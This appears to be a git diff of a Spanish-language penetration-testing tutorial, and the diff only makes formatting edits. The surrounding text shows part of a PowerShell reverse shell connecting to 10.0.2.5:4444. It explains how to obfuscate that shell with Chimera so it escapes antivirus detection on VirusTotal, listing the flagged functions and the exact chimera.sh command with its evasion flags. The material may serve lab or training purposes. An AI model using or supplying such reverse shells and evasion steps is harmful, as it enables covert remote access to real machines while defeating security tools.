@@ -198,7 +198,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.0.2.5",4444);$stream = $cl
 </p>
 </details>
 
-Para ofuscarlo debemos ejectar el siguiente comando (sin -b) e ir probando el resultado en [VirusTotal](https://www.virustotal.com/gui/home/upload). En los detalles alertan las siguientes funciones: new-object y out-string. Mirando la ayuda esto es lo que podemos hacer con Chimera:
+Para ofuscarlo debemos ejectar el siguiente comando (sin -b) e ir probando el resultado en [VirusTotal](https://www.virustotal.com/gui/home/upload). En los detalles alertan las siguientes funciones: new-object y out-string.<br><br>Mirando la ayuda esto es lo que podemos hacer con Chimera:
 
 -f: Archivo de entrada.<br>
 -o: Archivo de salida.<br>
@@ -209,7 +209,7 @@ Para ofuscarlo debemos ejectar el siguiente comando (sin -b) e ir probando el re
 -c: Replazar comentarios con datos arbitrarios.<br>
 -h: Convertir direcciones IP addresses a hexadecimal.<br>
 -s: Substitute various strings.<br>
--b: Marcado de palabras (importante).<br>
+-b: Marcado de palabras (importante).<br><br>Quedando finalmente:
 
 ```bash
 /opt/chimera.sh -f /opt/shells/powershell_reverse_shell.ps1 -o /tmp/chimera.ps1 -l 4 -v -c -i -j -g -r -p -b new-object,out-string
